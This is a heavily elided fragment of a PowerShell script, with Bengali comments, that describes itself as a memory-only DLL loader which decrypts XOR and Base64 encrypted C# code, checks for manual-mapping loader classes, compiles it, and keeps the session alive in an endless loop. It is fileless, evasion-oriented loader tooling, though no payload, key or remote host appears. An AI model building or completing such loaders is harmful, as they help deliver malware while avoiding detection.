...
<#
.SYNOPSIS
    Memory-only DLL loader – FULLY ENCRYPTED C# (XOR+Base64)
.DESCRIPTION
...
if (-not $decryptedCSharp) {
    ...
    # চেক করো ডিক্রিপ্ট করা স্ট্রিং-এ প্রয়োজনীয় ক্লাস আছে কিনা
    if ($decryptedCSharp -notmatch "ManualMapResult" -or $decryptedCSharp -notmatch "NativeLoader") {
        Write-Host "[!] Decrypted C# code seems invalid. Check XOR key or encrypted string." -ForegroundColor Red
    } else {
        # ৪.৪ – C# কম্পাইল
        try {
...
# ================================================================
#  ★★★ ৫. PowerShell খোলা রাখার জন্য অসীম লুপ ★★★
# ================================================================
Write-Host "[+] Script completed. Keeping PowerShell alive indefinitely." -ForegroundColor Cyan
while ($true) {
